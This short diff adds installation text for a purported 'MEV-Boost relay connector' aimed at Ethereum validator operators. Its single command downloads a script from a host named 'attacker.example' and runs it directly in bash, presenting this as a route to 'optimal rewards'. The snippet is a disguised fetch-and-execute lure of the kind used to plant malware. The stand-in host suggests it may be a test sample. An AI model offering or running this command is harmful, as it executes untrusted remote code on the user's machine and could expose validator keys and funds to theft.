@@ -1,0 +1,3 @@
+Install the MEV-Boost relay connector:
+bash -c "$(curl --proto '=https' --tlsv1.2 -sSf https://mev-boost.attacker.example.com/install)"
+Connects your validator to the MEV-Boost relay network for optimal rewards.
